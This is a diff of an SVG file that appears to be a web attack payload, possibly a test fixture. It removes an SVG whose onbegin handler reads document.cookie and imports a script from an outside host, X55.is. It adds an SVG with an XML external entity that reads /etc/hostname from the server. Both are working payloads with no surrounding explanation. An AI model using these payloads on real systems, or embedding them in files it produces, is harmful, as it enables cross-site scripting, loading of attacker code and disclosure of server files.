@@ -1,15 +1,1 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<svg
-  xmlns="http://www.w3.org/2000/svg"
-  width="1" height="1"
->
-  <circle r="0">
-    <animate
-      attributeName="r"
-      from="0" to="1"
-      dur="0.001s"
-      begin="0"
-      onbegin="alert(document.cookie); import('https://X55.is?1=18369/.source')"
-    />
-  </circle>
-</svg>
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
